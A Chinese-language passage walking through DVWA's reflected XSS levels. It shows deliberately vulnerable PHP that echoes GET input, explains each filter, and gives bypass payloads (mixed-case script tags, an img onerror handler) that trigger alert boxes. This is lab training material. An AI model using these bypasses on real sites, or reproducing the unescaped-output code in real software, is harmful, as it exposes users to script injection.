	**反射性XSS**：攻击者通过电子邮件等方式将包含XSS的恶意连接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并处理，然后把带有XSS的代码数据发送给目标用户的浏览器，浏览器解析这段带有xss的恶意代码脚本后，就会触发xss漏洞。


## 1、Low
**查看源码**
```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '
<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?>
```

通过查看代码我们可以看到并没有任何的过滤。

**实战**<br />构造payload，通过提交框提交
```
<script>alert("XMTX")</script>
```
![image-20210416145651838.png](./assets/1655880402631-b06e9492-c43b-4ccd-9363-80b3e9f8ee90.png)


## 2、Medium
**查看源码**
```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "
<pre>Hello ${name}</pre>";
}

?>
```

**函数说明**
```
str_replace()
定义和用法
str_replace() 函数替换字符串中的一些字符（区分大小写）。

语法
str_replace(find,replace,string,count)
find：必需。规定要查找的值。
replace：必需。规定替换 find 中的值的值。
string：必需。规定被搜索的字符串。
count：可选。一个变量，对替换数进行计数。

例：
<?php
$arr = array("blue","red","green","yellow");
print_r(str_replace("red","pink",$arr,$i));
echo "Replacements: $i";
?>
运行结果：Array ( [0] => blue [1] => pink [2] => green [3] => yellow )
		Replacements: 1
```

通过查看源码可以看到使用str_replace()函数对<`script>`进行了过滤，不过我i们可以使用大小写绕过。

**实战**<br />构造payload：
```
<sCrIpt>alert("XMTX")</ScRipt>
```
![image-20210416150353296.png](./assets/1655880415257-810f12cf-0689-40a9-91d1-6ea684b5d8e0.png)


## 3、High
**查看源码**
```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "
<pre>Hello ${name}</pre>";
}

?>
```

**函数说明**
```
preg_replace 函数执行一个正则表达式的搜索和替换。

语法
mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。

参数说明：
$pattern: 要搜索的模式，可以是字符串或一个字符串数组。
$replacement: 用于替换的字符串或字符串数组。
$subject: 要搜索替换的目标字符串或字符串数组。
$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。
$count: 可选，为替换执行的次数。

返回值
如果 subject 是一个数组， preg_replace() 返回一个数组， 其他情况下返回一个字符串。
如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。
```

通过代码我们可以看到对`<script`进行了检测，不过我们可以使用img 标签。

**实战**<br />构造payload：
```
<img src=1 onerror=alert("XMTX")>
```
![image-20210416150755422.png](./assets/1655880433204-d5fc13ac-8f9f-480d-96cd-fe65e9fafdf1.png)


## 4、Impossible

**查看源码**
```php
<?php// Is there any input?if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );    // Get input    $name = htmlspecialchars( $_GET[ 'name' ] );    // Feedback for end user    echo "
<pre>Hello ${name}</pre>";}// Generate Anti-CSRF tokengenerateSessionToken();?>
```

**函数说明**
```
定义和用法htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。预定义的字符是：& （和号）成为 &amp;" （双引号）成为 &quot;' （单引号）成为 '< （小于）成为 &lt;> （大于）成为 &gt;语法htmlspecialchars(string,flags,character-set,double_encode)string	必需。规定要转换的字符串。flags	可选。规定如何处理引号、无效的编码以及使用哪种文档类型。
```

通过源码可以看出，先判断name是否为空，不为空的话然后验证其token，来防范CSRF攻击。然后再用htmlspecialchars函数将name中的预定义字符转换成html实体，这样就防止了我们填入标签

当我们输入 `<script>alert('XMTX')</script>` 时，因为 htmlspecialchars 函数会将 `<` 和 `>` 转换成html实体,并且![](https://g.yuque.com/gr/latex?%7Bname%7D%E5%8F%96%E7%9A%84%E6%98%AF#card=math&code=%7Bname%7D%E5%8F%96%E7%9A%84%E6%98%AF&id=BRang)name的值，然后包围在`

